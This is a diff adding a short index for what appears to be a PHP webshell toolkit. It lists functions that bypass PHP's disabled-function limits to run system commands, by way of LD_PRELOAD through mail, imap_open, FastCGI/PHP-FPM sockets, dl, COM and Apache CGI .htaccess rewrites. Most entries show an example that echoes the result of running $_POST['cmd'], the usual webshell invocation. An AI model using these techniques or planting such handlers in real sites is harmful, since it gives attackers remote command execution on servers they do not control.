@@ -1,0 +1,41 @@
+184 -> 229 common cmd & shell for windows & linux
+common_exec_cmd($cmd)
+condition: exist exec||shell_exec||system||passthru||popen||proc_open
+example: echo common_exec_cmd($_POST["cmd"])
+
+230 -> 244 shell for linux
+pcntl_exec_cmd($cmd)
+condition: exist pcntl_exec
+example: echo pcntl_exec_cmd($_POST["cmd"])
+
+246 -> 283 shell for linux over mail service
+ld_prelod_exec_cmd($cmd)
+condition: exist mail||imap_mail||error_log||mb_send_mail
+example: echo ld_preload_exec_cmd($_POST['cmd'])
+
+288 -> 317 dl exec, ant system
+dl_exec($cmd)
+condition: exist dl
+example: echo dl_exec($_POST['cmd'])
+
+319 -> 334 shell for linux over imap (port 143 or etc)
+imap_open_exec($cmd)
+condition: exist imap_open
+example: echo imap_open_exec($_POST['cmd'])
+
+381 -> 438 fastcgi linux/unix/windows
+fastcgi_exec($cmd, $file< $host, $port) //default port=9000
+example:
+var_dump(fastcgi_exec("id",'/var/www/html/shell.php' , '127.0.0.1', 9002));
+echo fastcgi_exec("id",'/var/www/html/ant.php' , 'unix:///run/php/php7.3-fpm.sock');
+var_dump(fastcgi_exec("whoami",'C:\\phpstudy2018\\PHPTutorial\\WWW\test\\apache\\1.php' , '127.0.0.1', 9000));
+
+440 -> 464 cmd for windows < php v5.4.45
+com_exec($cmd)
+example: echo com_exec($_POST['cmd'])
+
+466 -> 501 cmd & shell for windows & linux (apache cgi exec) - config append .htaccess
+apache_cgi_exec($cmd, $dir) //default dir = '.'
+example: echo apache_cgi_exec($_POST['cmd'])
+
+504 -> 522 front-end
